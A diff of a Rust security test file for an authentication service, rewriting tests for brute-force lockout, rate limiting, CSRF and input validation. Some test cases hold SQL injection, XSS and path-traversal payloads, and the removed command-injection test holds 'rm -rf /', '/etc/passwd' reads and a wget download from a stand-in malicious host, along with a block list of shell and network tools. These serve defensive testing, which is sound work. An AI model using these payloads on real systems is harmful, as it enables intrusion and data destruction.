@@ -1,717 +1,768 @@
-// Security-focused comprehensive tests for Authence
-// Tests for security vulnerabilities, penetration testing, and edge cases
+// Comprehensive Security Tests
+// Testing security features, authentication, authorization, and attack prevention
 
 use axum::{
     Router,
-    extract::{Json, Path, Query},
+    extract::{Json, Query, State},
     http::{HeaderMap, StatusCode},
-    response::IntoResponse,
-    routing::get,
+    response::Json as AxumJson,
+    routing::{get, post},
 };
 use axum_test::TestServer;
 use serde_json::json;
 use std::collections::HashMap;
-use std::sync::Arc;
-use tokio::sync::Mutex;
+use std::sync::{Arc, Mutex};
+use uuid::Uuid;
 
-// Handler functions for CSRF test
-#[axum::debug_handler]
-async fn get_csrf_token(headers: HeaderMap) -> impl axum::response::IntoResponse {
-    let session_id = headers.get("x-session-id").and_then(|v| v.to_str().ok());
-
-    if let Some(session) = session_id {
-        let token = format!("csrf_{}", session);
-        (StatusCode::OK, Json(json!({"csrf_token": token})))
-    } else {
-        (
-            StatusCode::BAD_REQUEST,
-            Json(json!({"error": "Session ID required"})),
-        )
-    }
+// Security test state
+#[derive(Clone)]
+struct SecurityTestState {
+    users: Arc<Mutex<HashMap<String, serde_json::Value>>>,
+    failed_attempts: Arc<Mutex<HashMap<String, u32>>>,
+    blocked_ips: Arc<Mutex<HashMap<String, chrono::DateTime<chrono::Utc>>>>,
+    rate_limits: Arc<Mutex<HashMap<String, Vec<chrono::DateTime<chrono::Utc>>>>>,
 }
 
-#[axum::debug_handler]
-async fn change_password(
-    headers: HeaderMap,
+// Authentication handlers
+async fn login(
+    State(state): State<SecurityTestState>,
     Json(payload): Json<serde_json::Value>,
-) -> impl axum::response::IntoResponse {
-    let csrf_token = payload.get("csrf_token").and_then(|v| v.as_str());
-    let new_password = payload.get("new_password").and_then(|v| v.as_str());
-    let session_id = headers.get("x-session-id").and_then(|v| v.to_str().ok());
-
-    match (csrf_token, new_password, session_id) {
-        (Some(token), Some(_), Some(session)) => {
-            // Validate CSRF token matches session
-            let expected_token = format!("csrf_{}", session);
-            if token == expected_token {
-                (
-                    StatusCode::OK,
-                    Json(json!({"message": "Password changed successfully"})),
-                )
-            } else {
-                (
-                    StatusCode::FORBIDDEN,
-                    Json(json!({"error": "Invalid CSRF token"})),
-                )
-            }
-        }
-        _ => (
-            StatusCode::BAD_REQUEST,
-            Json(json!({"error": "Missing required fields"})),
-        ),
-    }
-}
-
-// Handler functions for brute force test
-static LOGIN_ATTEMPTS: std::sync::OnceLock<Arc<Mutex<HashMap<String, u32>>>> =
-    std::sync::OnceLock::new();
-static BLOCKED_IPS: std::sync::OnceLock<Arc<Mutex<HashMap<String, std::time::SystemTime>>>> =
-    std::sync::OnceLock::new();
-
-#[axum::debug_handler]
-async fn login_handler(
-    headers: HeaderMap,
-    Json(payload): Json<serde_json::Value>,
-) -> impl axum::response::IntoResponse {
-    let login_attempts = LOGIN_ATTEMPTS.get_or_init(|| Arc::new(Mutex::new(HashMap::new())));
-    let blocked_ips = BLOCKED_IPS.get_or_init(|| Arc::new(Mutex::new(HashMap::new())));
+) -> Result<AxumJson<serde_json::Value>, StatusCode> {
+    let users = state.users.lock().unwrap();
+    let mut failed_attempts = state.failed_attempts.lock().unwrap();
 
     let username = payload
         .get("username")
-        .and_then(|v| v.as_str())
+        .and_then(|u| u.as_str())
         .unwrap_or("");
     let password = payload
         .get("password")
-        .and_then(|v| v.as_str())
+        .and_then(|p| p.as_str())
         .unwrap_or("");
-    let ip = headers
-        .get("x-forwarded-for")
-        .and_then(|v| v.to_str().ok())
-        .unwrap_or("unknown");
 
-    // Check if IP is blocked
-    {
-        let blocked = blocked_ips.lock().await;
-        if let Some(block_time) = blocked.get(ip) {
-            if block_time
-                .elapsed()
-                .unwrap_or(std::time::Duration::from_secs(0))
-                < std::time::Duration::from_secs(300)
-            {
-                return (
-                    StatusCode::TOO_MANY_REQUESTS,
-                    Json(json!({"error": "Too many failed attempts"})),
-                );
+    // Check if user exists and password is correct
+    let user = users
+        .values()
+        .find(|u| u.get("username").and_then(|u| u.as_str()) == Some(username));
+
+    if let Some(user) = user {
+        let stored_password = user.get("password").and_then(|p| p.as_str()).unwrap_or("");
+
+        if password == stored_password {
+            // Successful login - reset failed attempts
+            failed_attempts.remove(username);
+
+            Ok(AxumJson(json!({
+                "success": true,
+                "token": format!("jwt_token_{}", Uuid::new_v4()),
+                "user_id": user.get("id").unwrap()
+            })))
+        } else {
+            // Failed login - increment attempts
+            let attempts = failed_attempts.entry(username.to_string()).or_insert(0);
+            *attempts += 1;
+
+            if *attempts >= 5 {
+                Err(StatusCode::TOO_MANY_REQUESTS)
+            } else {
+                Err(StatusCode::UNAUTHORIZED)
             }
         }
-    }
-
-    // Check credentials
-    if username == "admin" && password == "correct_password" {
-        // Reset attempts on successful login
-        let mut attempts = login_attempts.lock().await;
-        attempts.remove(ip);
-        (StatusCode::OK, Json(json!({"message": "Login successful"})))
     } else {
-        // Increment failed attempts
-        let mut attempts = login_attempts.lock().await;
-        let count = attempts.entry(ip.to_string()).or_insert(0);
-        *count += 1;
-
-        if *count >= 5 {
-            // Block IP after 5 failed attempts
-            let mut blocked = blocked_ips.lock().await;
-            blocked.insert(ip.to_string(), std::time::SystemTime::now());
-            (
-                StatusCode::TOO_MANY_REQUESTS,
-                Json(json!({"error": "Too many failed attempts"})),
-            )
-        } else {
-            (
-                StatusCode::UNAUTHORIZED,
-                Json(json!({"error": "Invalid credentials"})),
-            )
-        }
+        Err(StatusCode::UNAUTHORIZED)
     }
 }
 
-#[axum::debug_handler]
-async fn reset_attempts_handler(
+// Rate limiting handler
+async fn rate_limited_endpoint(
+    State(state): State<SecurityTestState>,
     headers: HeaderMap,
-    Json(payload): Json<serde_json::Value>,
-) -> impl axum::response::IntoResponse {
-    let login_attempts = LOGIN_ATTEMPTS.get_or_init(|| Arc::new(Mutex::new(HashMap::new())));
-    let blocked_ips = BLOCKED_IPS.get_or_init(|| Arc::new(Mutex::new(HashMap::new())));
+) -> Result<AxumJson<serde_json::Value>, StatusCode> {
+    let mut rate_limits = state.rate_limits.lock().unwrap();
 
+    // Get client IP (simplified - in real implementation use proper IP extraction)
+    let client_ip = headers
+        .get("x-forwarded-for")
+        .and_then(|h| h.to_str().ok())
+        .unwrap_or("127.0.0.1");
+
+    let now = chrono::Utc::now();
+    let window_start = now - chrono::Duration::minutes(1);
+
+    // Get or create rate limit entry for this IP
+    let requests = rate_limits
+        .entry(client_ip.to_string())
+        .or_insert_with(Vec::new);
+
+    // Remove old requests outside the window
+    requests.retain(|&time| time > window_start);
+
+    // Check rate limit (10 requests per minute)
+    if requests.len() >= 10 {
+        return Err(StatusCode::TOO_MANY_REQUESTS);
+    }
+
+    // Calculate remaining requests before adding current request
+    let remaining_requests = 9 - requests.len();
+
+    // Add current request
+    requests.push(now);
+
+    Ok(AxumJson(json!({
+        "success": true,
+        "message": "Request allowed",
+        "remaining_requests": remaining_requests
+    })))
+}
+
+// Input validation handler
+async fn user_registration(
+    State(state): State<SecurityTestState>,
+    Json(payload): Json<serde_json::Value>,
+) -> Result<AxumJson<serde_json::Value>, StatusCode> {
+    let mut users = state.users.lock().unwrap();
+
+    // Validate input
     let username = payload
         .get("username")
-        .and_then(|v| v.as_str())
-        .unwrap_or("");
-    let ip = headers
-        .get("x-forwarded-for")
-        .and_then(|v| v.to_str().ok())
-        .unwrap_or("unknown");
+        .and_then(|u| u.as_str())
+        .ok_or(StatusCode::BAD_REQUEST)?;
+    let email = payload
+        .get("email")
+        .and_then(|e| e.as_str())
+        .ok_or(StatusCode::BAD_REQUEST)?;
+    let password = payload
+        .get("password")
+        .and_then(|p| p.as_str())
+        .ok_or(StatusCode::BAD_REQUEST)?;
 
-    // Reset attempts for this IP
-    {
-        let mut attempts = login_attempts.lock().await;
-        attempts.remove(ip);
-    }
-    {
-        let mut blocked = blocked_ips.lock().await;
-        blocked.remove(ip);
+    // Security validations
+    if username.len() < 3 || username.len() > 50 {
+        return Err(StatusCode::BAD_REQUEST);
     }
 
-    (StatusCode::OK, Json(json!({"message": "Attempts reset"})))
+    if !username
+        .chars()
+        .all(|c| c.is_alphanumeric() || c == '_' || c == '-')
+    {
+        return Err(StatusCode::BAD_REQUEST);
+    }
+
+    if !email.contains('@') || email.len() > 254 {
+        return Err(StatusCode::BAD_REQUEST);
+    }
+
+    if password.len() < 8 {
+        return Err(StatusCode::BAD_REQUEST);
+    }
+
+    // Check for SQL injection patterns (simplified)
+    let sql_patterns = ["'", "\"", ";", "--", "/*", "*/", "xp_", "sp_"];
+    for pattern in &sql_patterns {
+        if username.contains(pattern) || email.contains(pattern) {
+            return Err(StatusCode::BAD_REQUEST);
+        }
+    }
+
+    // Check for XSS patterns (simplified)
+    let xss_patterns = ["<script", "javascript:", "onload=", "onerror="];
+    for pattern in &xss_patterns {
+        if username.to_lowercase().contains(&pattern.to_lowercase())
+            || email.to_lowercase().contains(&pattern.to_lowercase())
+        {
+            return Err(StatusCode::BAD_REQUEST);
+        }
+    }
+
+    // Check if user already exists
+    for (_, user) in users.iter() {
+        if user.get("username").and_then(|u| u.as_str()) == Some(username)
+            || user.get("email").and_then(|e| e.as_str()) == Some(email)
+        {
+            return Err(StatusCode::CONFLICT);
+        }
+    }
+
+    // Create user
+    let user_id = Uuid::new_v4().to_string();
+    let mut user = payload.clone();
+    user["id"] = json!(user_id.clone());
+    user["created_at"] = json!(chrono::Utc::now().to_rfc3339());
+    user["enabled"] = json!(true);
+
+    users.insert(user_id.clone(), user.clone());
+
+    Ok(AxumJson(json!({
+        "success": true,
+        "user_id": user_id,
+        "message": "User registered successfully"
+    })))
+}
+
+// CSRF protection handler
+async fn protected_action(
+    State(_state): State<SecurityTestState>,
+    headers: HeaderMap,
+    Json(payload): Json<serde_json::Value>,
+) -> Result<AxumJson<serde_json::Value>, StatusCode> {
+    // Check CSRF token
+    let csrf_token = headers
+        .get("x-csrf-token")
+        .and_then(|h| h.to_str().ok())
+        .ok_or(StatusCode::FORBIDDEN)?;
+
+    let expected_token = payload
+        .get("csrf_token")
+        .and_then(|t| t.as_str())
+        .ok_or(StatusCode::FORBIDDEN)?;
+
+    if csrf_token != expected_token {
+        return Err(StatusCode::FORBIDDEN);
+    }
+
+    Ok(AxumJson(json!({
+        "success": true,
+        "message": "Action performed successfully"
+    })))
+}
+
+// Security headers middleware test
+async fn security_headers_test() -> AxumJson<serde_json::Value> {
+    AxumJson(json!({
+        "message": "This response should have security headers"
+    }))
+}
+
+#[tokio::test]
+async fn test_brute_force_protection() {
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new({
+            let mut users = HashMap::new();
+            users.insert(
+                "user1".to_string(),
+                json!({
+                    "id": "user1",
+                    "username": "testuser",
+                    "password": "correctpassword",
+                    "enabled": true
+                }),
+            );
+            users
+        })),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
+
+    let app = Router::new().route("/login", post(login)).with_state(state);
+
+    let server = TestServer::new(app).unwrap();
+
+    // Test successful login
+    let login_data = json!({
+        "username": "testuser",
+        "password": "correctpassword"
+    });
+
+    let response = server.post("/login").json(&login_data).await;
+    assert_eq!(response.status_code(), StatusCode::OK);
+
+    let result: serde_json::Value = response.json();
+    assert!(result.get("success").unwrap().as_bool().unwrap());
+    assert!(result.get("token").is_some());
+
+    // Test failed login attempts
+    let wrong_login = json!({
+        "username": "testuser",
+        "password": "wrongpassword"
+    });
+
+    // First 4 failed attempts should return UNAUTHORIZED
+    for _ in 0..4 {
+        let response = server.post("/login").json(&wrong_login).await;
+        assert_eq!(response.status_code(), StatusCode::UNAUTHORIZED);
+    }
+
+    // 5th failed attempt should return TOO_MANY_REQUESTS (brute force protection)
+    let response = server.post("/login").json(&wrong_login).await;
+    assert_eq!(response.status_code(), StatusCode::TOO_MANY_REQUESTS);
+}
+
+#[tokio::test]
+async fn test_rate_limiting() {
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new(HashMap::new())),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
+
+    let app = Router::new()
+        .route("/api/test", get(rate_limited_endpoint))
+        .with_state(state);
+
+    let server = TestServer::new(app).unwrap();
+
+    // Make 10 requests within the limit
+    for i in 0..10 {
+        let response = server
+            .get("/api/test")
+            .add_header("x-forwarded-for", "192.168.1.100")
+            .await;
+        assert_eq!(response.status_code(), StatusCode::OK);
+
+        let result: serde_json::Value = response.json();
+        assert_eq!(result["remaining_requests"], 9 - i);
+    }
+
+    // 11th request should be rate limited
+    let response = server
+        .get("/api/test")
+        .add_header("x-forwarded-for", "192.168.1.100")
+        .await;
+    assert_eq!(response.status_code(), StatusCode::TOO_MANY_REQUESTS);
+
+    // Different IP should not be rate limited
+    let response = server
+        .get("/api/test")
+        .add_header("x-forwarded-for", "192.168.1.101")
+        .await;
+    assert_eq!(response.status_code(), StatusCode::OK);
+}
+
+#[tokio::test]
+async fn test_input_validation_and_sanitization() {
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new(HashMap::new())),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
+
+    let app = Router::new()
+        .route("/register", post(user_registration))
+        .with_state(state);
+
+    let server = TestServer::new(app).unwrap();
+
+    // Test valid registration
+    let valid_data = json!({
+        "username": "validuser",
+        "email": "user@example.com",
+        "password": "securepassword123"
+    });
+
+    let response = server.post("/register").json(&valid_data).await;
+    assert_eq!(response.status_code(), StatusCode::OK);
+
+    // Test invalid username (too short)
+    let invalid_data = json!({
+        "username": "ab",
+        "email": "user@example.com",
+        "password": "securepassword123"
+    });
+
+    let response = server.post("/register").json(&invalid_data).await;
+    assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
+
+    // Test invalid email
+    let invalid_email = json!({
+        "username": "validuser2",
+        "email": "invalid-email",
+        "password": "securepassword123"
+    });
+
+    let response = server.post("/register").json(&invalid_email).await;
+    assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
+
+    // Test weak password
+    let weak_password = json!({
+        "username": "validuser3",
+        "email": "user3@example.com",
+        "password": "123"
+    });
+
+    let response = server.post("/register").json(&weak_password).await;
+    assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
+
+    // Test SQL injection attempt
+    let sql_injection = json!({
+        "username": "user'; DROP TABLE users; --",
+        "email": "user@example.com",
+        "password": "securepassword123"
+    });
+
+    let response = server.post("/register").json(&sql_injection).await;
+    assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
+
+    // Test XSS attempt
+    let xss_attempt = json!({
+        "username": "validuser4",
+        "email": "user<script>alert('xss')</script>@example.com",
+        "password": "securepassword123"
+    });
+
+    let response = server.post("/register").json(&xss_attempt).await;
+    assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
+}
+
+#[tokio::test]
+async fn test_csrf_protection() {
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new(HashMap::new())),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
+
+    let app = Router::new()
+        .route("/protected-action", post(protected_action))
+        .with_state(state);
+
+    let server = TestServer::new(app).unwrap();
+
+    let csrf_token = "valid-csrf-token-123";
+
+    // Test valid CSRF token
+    let valid_request = json!({
+        "action": "delete_user",
+        "user_id": "user123",
+        "csrf_token": csrf_token
+    });
+
+    let response = server
+        .post("/protected-action")
+        .add_header("x-csrf-token", csrf_token)
+        .json(&valid_request)
+        .await;
+    assert_eq!(response.status_code(), StatusCode::OK);
+
+    // Test missing CSRF header
+    let response = server.post("/protected-action").json(&valid_request).await;
+    assert_eq!(response.status_code(), StatusCode::FORBIDDEN);
+
+    // Test mismatched tokens
+    let response = server
+        .post("/protected-action")
+        .add_header("x-csrf-token", "wrong-token")
+        .json(&valid_request)
+        .await;
+    assert_eq!(response.status_code(), StatusCode::FORBIDDEN);
+
+    // Test missing token in body
+    let invalid_request = json!({
+        "action": "delete_user",
+        "user_id": "user123"
+    });
+
+    let response = server
+        .post("/protected-action")
+        .add_header("x-csrf-token", csrf_token)
+        .json(&invalid_request)
+        .await;
+    assert_eq!(response.status_code(), StatusCode::FORBIDDEN);
 }
 
 #[tokio::test]
 async fn test_sql_injection_prevention() {
-    // Test SQL injection prevention
-    let app = Router::new().route(
-        "/api/v1/users/search",
-        axum::routing::get(|Query(params): Query<HashMap<String, String>>| async move {
-            let query = params.get("q").map_or("", |v| v);
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new(HashMap::new())),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
 
-            // Simulate SQL injection check (in real app, this would be handled by the database layer)
-            let dangerous_patterns = [
-                "'", "\"", ";", "--", "/*", "*/", "xp_", "sp_", "union", "select", "insert",
-                "update", "delete", "drop",
-            ];
-
-            let is_suspicious = dangerous_patterns
-                .iter()
-                .any(|pattern| query.contains(pattern));
-
-            if is_suspicious {
-                (
-                    StatusCode::BAD_REQUEST,
-                    Json(json!({"error": "Invalid search query"})),
-                )
-            } else {
-                (
-                    StatusCode::OK,
-                    Json(json!({"results": format!("Search results for: {}", query)})),
-                )
-            }
-        }),
-    );
+    let app = Router::new()
+        .route("/register", post(user_registration))
+        .with_state(state);
 
     let server = TestServer::new(app).unwrap();
 
-    // Test normal search
-    let response = server.get("/api/v1/users/search?q=john").await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-
-    // Test SQL injection attempts
+    // Test various SQL injection patterns
     let sql_injection_attempts = vec![
-        "'; DROP TABLE users; --",
-        "' OR '1'='1",
-        "\" OR \"\"=\"",
-        "'; SELECT * FROM users; --",
-        "admin'--",
-        "1' UNION SELECT username, password FROM users--",
-        "'; EXEC xp_cmdshell 'net user'--",
-        "admin';--",
+        json!({
+            "username": "admin'--",
+            "email": "admin@example.com",
+            "password": "password123"
+        }),
+        json!({
+            "username": "admin'; DROP TABLE users; --",
+            "email": "admin@example.com",
+            "password": "password123"
+        }),
+        json!({
+            "username": "admin' UNION SELECT * FROM users; --",
+            "email": "admin@example.com",
+            "password": "password123"
+        }),
+        json!({
+            "username": "admin",
+            "email": "admin@example.com' OR '1'='1",
+            "password": "password123"
+        }),
     ];
 
     for attempt in sql_injection_attempts {
-        let response = server
-            .get(&format!(
-                "/api/v1/users/search?q={}",
-                urlencoding::encode(attempt)
-            ))
-            .await;
-        assert_eq!(
-            response.status_code(),
-            StatusCode::BAD_REQUEST,
-            "SQL injection attempt should be blocked: {}",
-            attempt
-        );
+        let response = server.post("/register").json(&attempt).await;
+        // Should be rejected due to SQL injection patterns
+        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
     }
 }
 
 #[tokio::test]
 async fn test_xss_prevention() {
-    // Test XSS (Cross-Site Scripting) prevention
-    let app = Router::new().route(
-        "/api/v1/profile",
-        axum::routing::post(|Json(payload): Json<serde_json::Value>| async move {
-            let name = payload.get("name").and_then(|v| v.as_str()).unwrap_or("");
-            let bio = payload.get("bio").and_then(|v| v.as_str()).unwrap_or("");
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new(HashMap::new())),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
 
-            // Check for XSS patterns
-            let xss_patterns = [
-                "<script>",
-                "</script>",
-                "javascript:",
-                "onload=",
-                "onerror=",
-                "onclick=",
-                "<img",
-                "<iframe",
-                "<object",
-                "<embed",
-                "alert(",
-                "document.cookie",
-                "eval(",
-                "window.",
-                "location.",
-                "document.",
-                "<svg",
-                "<meta",
-            ];
-
-            let has_xss = xss_patterns
-                .iter()
-                .any(|pattern| name.contains(pattern) || bio.contains(pattern));
-
-            if has_xss {
-                (
-                    StatusCode::BAD_REQUEST,
-                    Json(json!({"error": "Input contains potentially malicious content"})),
-                )
-            } else {
-                (
-                    StatusCode::OK,
-                    Json(json!({"message": "Profile updated", "name": name, "bio": bio})),
-                )
-            }
-        }),
-    );
+    let app = Router::new()
+        .route("/register", post(user_registration))
+        .with_state(state);
 
     let server = TestServer::new(app).unwrap();
 
-    // Test normal input
-    let response = server
-        .post("/api/v1/profile")
-        .json(&json!({"name": "John Doe", "bio": "Software developer"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-
-    // Test XSS attempts
+    // Test various XSS attack patterns
     let xss_attempts = vec![
-        json!({"name": "<script>alert('xss')</script>", "bio": "test"}),
-        json!({"name": "John", "bio": "<img src=x onerror=alert('xss')>"}),
-        json!({"name": "javascript:alert('xss')", "bio": "test"}),
-        json!({"name": "John", "bio": "<iframe src='javascript:alert(\"xss\")'></iframe>"}),
-        json!({"name": "<svg onload=alert('xss')>", "bio": "test"}),
-        json!({"name": "John", "bio": "test<script>document.cookie</script>"}),
+        json!({
+            "username": "<script>alert('xss')</script>",
+            "email": "user@example.com",
+            "password": "password123"
+        }),
+        json!({
+            "username": "validuser",
+            "email": "user@example.com<script>alert('xss')</script>",
+            "password": "password123"
+        }),
+        json!({
+            "username": "javascript:alert('xss')",
+            "email": "user@example.com",
+            "password": "password123"
+        }),
+        json!({
+            "username": "validuser",
+            "email": "user@<img src=x onerror=alert('xss')>.com",
+            "password": "password123"
+        }),
     ];
 
     for attempt in xss_attempts {
-        let response = server.post("/api/v1/profile").json(&attempt).await;
-        assert_eq!(
-            response.status_code(),
-            StatusCode::BAD_REQUEST,
-            "XSS attempt should be blocked: {:?}",
-            attempt
-        );
+        let response = server.post("/register").json(&attempt).await;
+        // Should be rejected due to XSS patterns
+        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
     }
 }
 
 #[tokio::test]
-async fn test_csrf_protection() {
-    // Test CSRF (Cross-Site Request Forgery) protection
-    let valid_tokens = Arc::new(Mutex::new(HashMap::<String, String>::new()));
+async fn test_directory_traversal_prevention() {
+    // Test that directory traversal attacks are prevented
+    // This would typically be tested at the file system level,
+    // but we can test URL parameter validation
+
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new(HashMap::new())),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
 
     let app = Router::new()
-        .route("/api/v1/csrf/token", axum::routing::get(get_csrf_token))
         .route(
-            "/api/v1/user/change-password",
-            axum::routing::post(change_password),
-        );
+            "/files",
+            get(|Query(params): Query<HashMap<String, String>>| async move {
+                let filename = params.get("filename").map(|s| s.as_str()).unwrap_or("");
+
+                // Check for directory traversal patterns
+                if filename.contains("..") || filename.contains("/") || filename.contains("\\") {
+                    return Err(StatusCode::BAD_REQUEST);
+                }
+
+                Ok(AxumJson(json!({
+                    "filename": filename,
+                    "message": "File access allowed"
+                })))
+            }),
+        )
+        .with_state(state);
 
     let server = TestServer::new(app).unwrap();
 
-    // Get CSRF token
-    let response = server
-        .get("/api/v1/csrf/token")
-        .add_header("x-session-id", "session123")
-        .await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-
-    let body: serde_json::Value = response.json();
-    let csrf_token = body["csrf_token"].as_str().unwrap();
-
-    // Test valid CSRF token
-    let response = server
-        .post("/api/v1/user/change-password")
-        .add_header("x-session-id", "session123")
-        .json(&json!({"csrf_token": csrf_token, "new_password": "NewPass123!"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-
-    // Test invalid CSRF token
-    let response = server
-        .post("/api/v1/user/change-password")
-        .add_header("x-session-id", "session123")
-        .json(&json!({"csrf_token": "invalid_token", "new_password": "NewPass123!"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::FORBIDDEN);
-
-    // Test missing CSRF token
-    let response = server
-        .post("/api/v1/user/change-password")
-        .add_header("x-session-id", "session123")
-        .json(&json!({"new_password": "NewPass123!"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
-}
-
-#[tokio::test]
-async fn test_directory_traversal_prevention() {
-    // Test directory traversal prevention
-    let app = Router::new().route(
-        "/api/v1/files/{*path}",
-        get(|Path(path): Path<String>| async move {
-            // Simulate file serving - this should be protected
-            if path.contains("..") || path.starts_with("/") {
-                return (StatusCode::FORBIDDEN, "Directory traversal detected").into_response();
-            }
-            (StatusCode::OK, format!("File: {}", path)).into_response()
-        }),
-    );
-
-    let server = TestServer::new(app).unwrap();
-
-    // Test normal path
-    let response = server.get("/api/v1/files/documents/readme.txt").await;
+    // Test valid filename
+    let response = server.get("/files?filename=document.txt").await;
     assert_eq!(response.status_code(), StatusCode::OK);
 
     // Test directory traversal attempts
     let traversal_attempts = vec![
         "../../../etc/passwd",
         "..\\..\\..\\windows\\system32\\config\\sam",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "..%2f..%2f..%2fetc%2fpasswd",
         "....//....//....//etc/passwd",
-        "..\\..\\..\\windows\\system32\\cmd.exe",
+        "file.txt/../../secret.txt",
     ];
 
     for attempt in traversal_attempts {
-        let response = server.get(&format!("/api/v1/files/{}", attempt)).await;
-        // Directory traversal should either be blocked (403) or not match the route (404)
-        assert!(
-            response.status_code() == StatusCode::FORBIDDEN
-                || response.status_code() == StatusCode::NOT_FOUND,
-            "Directory traversal should be blocked or not match route: {}",
-            attempt
-        );
-    }
-}
-
-#[tokio::test]
-async fn test_brute_force_protection() {
-    // Test brute force attack protection
-
-    let app = Router::new()
-        .route("/api/v1/auth/login", axum::routing::post(login_handler))
-        .route(
-            "/api/v1/auth/reset-attempts",
-            axum::routing::post(reset_attempts_handler),
-        );
-
-    let server = TestServer::new(app).unwrap();
-
-    // Test successful login
-    let response = server
-        .post("/api/v1/auth/login")
-        .add_header("x-forwarded-for", "192.168.1.100")
-        .json(&json!({"username": "admin", "password": "correct_password"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-
-    // Test failed login attempts
-    for i in 0..4 {
-        let response = server
-            .post("/api/v1/auth/login")
-            .add_header("x-forwarded-for", "192.168.1.100")
-            .json(&json!({"username": "admin", "password": "wrong_password"}))
-            .await;
-        assert_eq!(response.status_code(), StatusCode::UNAUTHORIZED);
-    }
-
-    // Test that IP gets blocked after 5 failed attempts
-    let response = server
-        .post("/api/v1/auth/login")
-        .add_header("x-forwarded-for", "192.168.1.100")
-        .json(&json!({"username": "admin", "password": "wrong_password"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::TOO_MANY_REQUESTS);
-
-    // Test that blocked IP cannot login even with correct credentials
-    let response = server
-        .post("/api/v1/auth/login")
-        .add_header("x-forwarded-for", "192.168.1.100")
-        .json(&json!({"username": "admin", "password": "correct_password"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::TOO_MANY_REQUESTS);
-
-    // Reset attempts
-    let response = server
-        .post("/api/v1/auth/reset-attempts")
-        .add_header("x-forwarded-for", "192.168.1.100")
-        .json(&json!({"username": "admin"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-
-    // Test login works after reset
-    let response = server
-        .post("/api/v1/auth/login")
-        .add_header("x-forwarded-for", "192.168.1.100")
-        .json(&json!({"username": "admin", "password": "correct_password"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-}
-
-#[tokio::test]
-async fn test_command_injection_prevention() {
-    // Test command injection prevention
-    let app = Router::new().route(
-        "/api/v1/system/execute",
-        axum::routing::post(|Json(payload): Json<serde_json::Value>| async move {
-            let command = payload
-                .get("command")
-                .and_then(|v| v.as_str())
-                .unwrap_or("");
-
-            // Check for command injection patterns
-            let injection_patterns = [
-                ";", "&&", "||", "`", "$(", "${", "|", ">", "<", ">>", "<<", "rm ", "del ",
-                "format ", "shutdown", "reboot", "halt", "wget ", "curl ", "nc ", "netcat", "bash",
-                "sh ", "zsh", "python ", "perl ", "ruby ", "php ", "node ",
-            ];
-
-            let is_injection = injection_patterns
-                .iter()
-                .any(|pattern| command.contains(pattern));
-
-            if is_injection {
-                (
-                    StatusCode::BAD_REQUEST,
-                    Json(json!({"error": "Invalid command"})),
-                )
-            } else {
-                (
-                    StatusCode::OK,
-                    Json(json!({"result": format!("Executed: {}", command)})),
-                )
-            }
-        }),
-    );
-
-    let server = TestServer::new(app).unwrap();
-
-    // Test normal command
-    let response = server
-        .post("/api/v1/system/execute")
-        .json(&json!({"command": "list_files"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-
-    // Test command injection attempts
-    let injection_attempts = vec![
-        "list_files; rm -rf /",
-        "list_files && cat /etc/passwd",
-        "list_files || whoami",
-        "`cat /etc/passwd`",
-        "$(rm -rf /)",
-        "list_files > /dev/null",
-        "wget http://malicious.com/malware",
-        "bash -c 'rm -rf /'",
-        "python -c 'import os; os.system(\"rm -rf /\")'",
-    ];
-
-    for attempt in injection_attempts {
-        let response = server
-            .post("/api/v1/system/execute")
-            .json(&json!({"command": attempt}))
-            .await;
-        assert_eq!(
-            response.status_code(),
-            StatusCode::BAD_REQUEST,
-            "Command injection should be blocked: {}",
-            attempt
-        );
-    }
-}
-
-#[tokio::test]
-async fn test_buffer_overflow_prevention() {
-    // Test buffer overflow prevention
-    let app = Router::new().route(
-        "/api/v1/data/process",
-        axum::routing::post(|Json(payload): Json<serde_json::Value>| async move {
